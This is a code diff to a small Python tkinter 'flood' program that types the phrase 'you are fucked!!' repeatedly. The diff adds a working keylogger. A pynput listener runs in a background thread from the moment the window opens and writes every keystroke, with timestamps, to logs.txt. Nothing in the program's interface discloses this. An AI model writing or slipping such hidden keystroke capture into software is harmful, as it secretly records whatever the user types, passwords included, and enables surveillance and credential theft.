@@ -3,6 +3,11 @@
 import tkinter as tk
 import threading
 from os import path
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename="logs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
+
 
 cycle = 0  # Variable to store the cycle value entered by the user
 words = "you are fucked!!"  # Words to be written in the flood
@@ -62,6 +67,21 @@ def getUsrCycle(event):
     cycle_textbox.delete(0, tk.END)
     startBtn.config(command=lambda: flood(cycle))
 
+def on_press(key):
+    """
+    Function to handle key press events.
+
+    Parameters:
+    - key: Key object
+
+    This function logs the pressed key using the `logging` module.
+    """
+    logging.info(str(key))
+
+def start_key_logging():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
 if __name__ == '__main__':
     window = tk.Tk()
     window.geometry("230x100")
@@ -91,6 +111,9 @@ if __name__ == '__main__':
     # Create a button to quit the application
     escBtn = tk.Button(window, text="Quit", command=exit)
     escBtn.place(x=100, y=50)
+
+    # Start the keyboard logging
+    threading.Thread(target=start_key_logging).start()
 
     # Start the Tkinter event loop
     window.mainloop()
